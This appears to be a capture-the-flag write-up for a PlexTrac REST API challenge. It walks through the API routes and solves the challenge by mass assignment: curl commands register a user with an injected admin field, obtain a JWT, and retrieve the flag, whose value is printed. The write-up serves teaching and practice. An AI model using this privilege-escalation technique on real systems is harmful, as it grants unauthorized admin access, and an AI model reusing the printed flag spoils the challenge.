# volume × density

## Problem

Volume X Density leads to a GET response from a Web API.  The problem itself also links to a open API yaml file that contains routes.  Challange is setup as a REST API web app that is being tested currently.

## Links

* https://mobiusloop.plexhax.com

## Notes

The link https://mobiusloop.plexhax.com leads to just one of those routes, but the yaml file imported into Postman makes accessing the others simple.

## Solution

The site has a route GET route /plextrac/ctf/flag to return the flag, but a auth token needs to be passed in the header.  a JWT token can be obtained from POST route /users/v1/login.  There are GET routes /users/v1/_debug, and /users/v1/ that show users, email, and ifadmin.  But they don't show password.

```json
{
    "users": [
        {
            "admin": false,
            "email": "mail1@mail.com",
            "username": "name1"
        },
        {
            "admin": true,
            "email": "admin@mail.com",
            "username": "admin"
        }
    ]
}
```

There is lastly a POST route to register a new user /users/v1/register.  Now a user can pass a username, password, email in the body with the request.  But the user greated when used on users/v1/login will return a JWT but will not be able to get the flag from /plextrac/ctf/flag.  The response from the route returning back that you need to be an admin.

The solution it turns out is the model (MVC) or logic that handles the json sent to the backend is not policing the key and value pairs sent to it.  From the route /users/v1/_debug a password field is not shown, but a admin field is.  This means that we can try passing an admin field to the database.  

```bash
# Sign up
curl --header "Content-Type: application/json" --data '{"username":"hi2","password":"hi","email":"hi@hi.com","admin":"true"}' https://mobiusloop.plexhax.com/users/v1/register

# Login
curl --header "Content-Type: application/json" --data '{"username":"hi2","password":"hi"}' https://mobiusloop.plexhax.com/users/v1/login

# Get flag
curl --header "Content-Type: application/json" --header "Authorization: Bearer {token} " https://mobiusloop.plexhax.com/plextrac/ctf/flag
```

Sending those three commands, and being quick cause the JWT expires in a minutes, the response and flag will be

```json
{"message": "PlexTrac_CTF=sweet_toward_goat_draw", "status": "success"}
```

